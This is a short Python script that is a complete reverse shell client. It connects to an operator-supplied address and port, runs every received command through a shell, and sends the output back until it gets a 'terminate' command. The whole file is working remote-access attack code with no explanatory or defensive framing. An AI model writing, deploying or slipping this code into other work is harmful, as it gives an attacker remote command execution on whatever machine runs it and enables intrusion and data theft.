import socket
import subprocess
import argparse

def connect(address_family=('localhost', 8080)):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(address_family)

    while 1:
        command = s.recv(1024)
        print("command:", command.decode())
        if 'terminate' in command.decode():
            s.send('Terminating session...'.encode('utf-8'))
            s.close()
            break
        else:
            cmd = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            s.send(cmd.stdout.read())
            s.send(cmd.stderr.read())

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument("-a", "--address", type=str,
                        help="Ip address to bind to")
    parser.add_argument("-p", "--port", type=int,
                        help="Port to bind to")
    args = parser.parse_args()

    if args.address and args.port:
        connect((args.address, args.port))
    else:
        connect()
